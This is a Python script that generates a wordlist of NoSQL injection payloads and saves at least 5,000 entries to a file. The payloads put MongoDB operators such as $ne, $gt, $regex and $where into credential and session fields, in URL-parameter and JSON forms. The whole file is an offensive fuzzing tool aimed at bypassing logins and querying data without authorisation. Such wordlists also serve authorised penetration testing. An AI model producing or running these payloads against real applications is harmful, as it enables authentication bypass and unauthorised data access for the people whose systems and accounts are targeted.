#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_nosqli():
    p = set()

    # ========== 1. MONGODB OPERATORS (50+) ==========
    operators = [
        "$ne", "$gt", "$lt", "$in", "$or", "$and", "$nin", "$nor",
        "$exists", "$regex", "$where", "$all", "$elemMatch", "$size",
        "$mod", "$type", "$not", "$eq"
    ]
    for op in operators:
        p.add(op)

    # ========== 2. BASIC PAYLOAD (200+) ==========
    fields = ["username", "password", "email", "id", "role", "token", "session"]
    values = ["admin", "password", "admin@domain.com", "1", "admin", "abc123", "session123"]

    for field in fields:
        for op in operators[:10]:
            for val in values[:3]:
                p.add(f"{field}[{op}]={val}")
                p.add(f'{{"{field}": {{"{op}": "{val}"}}}}')

    # ========== 3. JSON PAYLOAD (200+) ==========
    for field in fields:
        p.add(f'{{"{field}": {{"$ne": null}}}}')
        p.add(f'{{"{field}": {{"$gt": ""}}}}')
        p.add(f'{{"{field}": {{"$lt": ""}}}}')
        p.add(f'{{"{field}": {{"$in": []}}}}')
        p.add(f'{{"{field}": {{"$or": []}}}}')
        p.add(f'{{"{field}": {{"$and": []}}}}')

    # ========== 4. COMBINED PAYLOAD (200+) ==========
    for f1 in fields[:3]:
        for f2 in fields[3:6]:
            for op1 in operators[:5]:
                for op2 in operators[:5]:
                    v1 = random.choice(values)
                    v2 = random.choice(values)
                    p.add(f"{f1}[{op1}]={v1}&{f2}[{op2}]={v2}")
                    p.add(f'{{"{f1}": {{"{op1}": "{v1}"}}, "{f2}": {{"{op2}": "{v2}"}}}}')

    # ========== 5. RANDOM (3000+) ==========
    while len(p) < 5000:
        field = random.choice(fields)
        op = random.choice(operators)
        val = random.choice(values)
        p.add(f"{field}[{op}]={val}")
        p.add(f'{{"{field}": {{"{op}": "{val}"}}}}')
        p.add(f'{{"{field}": {{"{op}": {val}}}}}')
        p.add(f"{field}[{op}]={val}&{random.choice(fields)}[{random.choice(operators)}]={random.choice(values)}")

    # ========== 6. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "nosqli.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] nosqli.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_nosqli()